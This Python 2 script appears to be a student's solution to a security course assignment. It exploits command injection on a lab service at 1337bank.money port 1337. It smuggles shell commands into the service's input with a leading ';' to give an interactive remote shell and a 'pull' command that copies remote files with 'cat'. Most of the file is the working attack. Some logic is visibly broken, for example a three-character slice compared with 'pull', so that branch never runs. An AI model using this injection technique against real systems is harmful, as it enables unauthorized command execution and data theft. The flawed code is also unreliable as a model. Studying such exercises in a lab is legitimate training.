"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket

host = "1337bank.money" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    temp_data = s.recv(1024)
    s.send(cmd+"\n")
    data = s.recv(1024)
    data = s.recv(1024)
    return data

def my_shell():
        while 2!=3:
            user_input = raw_input("Enter a command: ")
            if user_input == "quit":
                break
            elif user_input == "help":
                print("1. shell Drop into an interactive shell and allow users to gracefully exit\n")
                print("2. pull <remote-path> <local-path> Download files\n")
                print("3. help Shows this help menu\n")
                print("4. quit Quit the shell\n")
            elif user_input[0:3] == "pull":
                command = user_input.split()
                remote_path = command[1]
                local_path = command[2]
                content = execute_cmd(";cat " + remote_path)
                my_file = open(local_path, 'w')
                my_file.write(content)
                my_file.close()
            elif user_input == "shell":
                curr_dir = "/"
                inner_shell_input = raw_input(curr_dir + ">")
                while 9+10 != 21:
                    if inner_shell_input == "exit":
                        break
                    else:
                        if inner_shell_input[0:2] == "cd":
                            curr_dir = inner_shell_input[3:]
                            """
                                ";cd " + curr_dir + " && " +
                            """
                        content = execute_cmd(";cd " + curr_dir + " && " + inner_shell_input)
                        print(content)
                    inner_shell_input = raw_input(curr_dir + ">")
            else:
                print("1. shell Drop into an interactive shell and allow users to gracefully exit\n")
                print("2. pull <remote-path> <local-path> Download files\n")
                print("3. help Shows this help menu\n")
                print("4. quit Quit the shell\n")

if __name__ == '__main__':
    my_shell()
